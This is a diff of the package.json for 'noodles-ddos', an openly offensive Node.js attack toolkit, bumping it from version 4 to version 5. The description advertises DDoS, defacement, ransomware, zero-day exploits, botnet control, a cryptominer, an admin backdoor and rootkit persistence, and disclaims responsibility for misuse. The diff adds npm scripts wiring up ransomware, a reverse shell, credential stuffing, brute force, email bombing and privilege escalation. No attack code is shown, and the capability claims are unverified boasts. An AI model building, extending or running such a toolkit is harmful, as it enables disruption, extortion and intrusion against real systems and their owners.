@@ -1,7 +1,7 @@
 {
   "name": "noodles-ddos",
-  "version": "4.0.0",
-  "description": "A cutting-edge DDoS, deface, and connect web application. Boasts advanced attack vectors, botnet orchestration, zero-day exploits, custom Chromium build, and kernel-level access. ABSOLUTELY NO RESPONSIBILITY TAKEN FOR MISUSE. Features a REST API, Websocket integration, advanced logging with intrusion detection, and real-time attack monitoring. Includes self-updating exploit database, distributed worker support, and advanced evasion techniques.",
+  "version": "5.0.0",
+  "description": "😈Noodles: Unleash Chaos - DDoS, Deface, Connect, Ransomware & More. Cutting-edge attack vectors, zero-day exploits, custom Chromium build, kernel-level access. No responsibility for misuse. Features REST API, Websocket, advanced logging, intrusion detection, real-time attack monitoring, self-updating exploit DB, distributed worker support, advanced evasion. Includes cryptocurrency miner, admin backdoor, rootkit persistence.😈",
   "main": "ddos.js",
   "scripts": {
     "start": "node ddos.js",
@@ -13,6 +13,7 @@
     "chromium": "node chromium-setup.js",
     "deface": "node deface.js",
     "connect": "node connect.js",
+    "ransomware": "node ransomware.js",
     "api": "node api.js",
     "websocket": "node websocket.js",
     "logviewer": "node logviewer.js",
@@ -28,7 +29,7 @@
     "data-miner": "node data-miner.js",
     "zero-day": "node zero-day.js",
     "persistence": "node persistence.js",
-    "microservices": "concurrently \"node ddos.js\" \"node exploit.js\" \"npm run deface\" \"node connect.js\" \"node api.js\" \"npm run websocket\" \"npm run logviewer\" \"npm run dashboard\" \"node fuzzer.js\" \"node scanner.js\" \"node botnet.js\" \"node injector.js\" \"node honeypot.js\" \"node reverse-engineer.js\" \"node data-miner.js\" \"node zero-day.js\" \"node persistence.js\"",
+    "microservices": "concurrently \"npm run api\" \"npm run websocket\" \"npm run dashboard\" \"npm run logviewer\" \"npm run ddos-layer7\" \"npm run ddos-layer4\" \"npm run deface-upload\" \"npm run connect-reverse-shell\" \"npm run ransomware-deploy\" \"npm run exploit-database\" \"npm run botnet-control\" \"npm run fuzzer-advanced\" \"npm run scanner-vulnerability\" \"npm run injector-code\" \"npm run honeypot-advanced\" \"npm run miner-cryptocurrency\" \"npm run zero-day-exploit\" \"npm run persistence-rootkit\" \"npm run tor-relay\" \"npm run evasion-sandbox\" \"npm run report-intelligence\" \"npm run admin-backdoor\"",
     "full-setup": "npm install && npm run build && npm run chromium",
     "worker": "node worker.js",
     "stress": "node stress.js",
@@ -55,9 +56,17 @@
     "tor-relay": "node tor-relay.js",
     "evasion-sandbox": "node evasion-sandbox.js",
     "report-intelligence": "node report-intelligence.js",
-    "admin-backdoor": "node admin-backdoor.js"
+    "admin-backdoor": "node admin-backdoor.js",
+    "brute-force": "node brute-force.js",
+    "credential-stuffing": "node credential-stuffing.js",
+    "email-bombing": "node email-bombing.js",
+    "network-sniffer": "node network-sniffer.js",
+    "packet-forging": "node packet-forging.js",
+    "privilege-escalation": "node privilege-escalation.js",
+    "social-engineering": "node social-engineering.js",
+    "vulnerability-scanner": "node vulnerability-scanner.js"
   },
-  "author": "Noodles",
+  "author": "Noodles😈",
   "license": "MIT",
   "dependencies": {
     "@types/express": "^4.17.21",
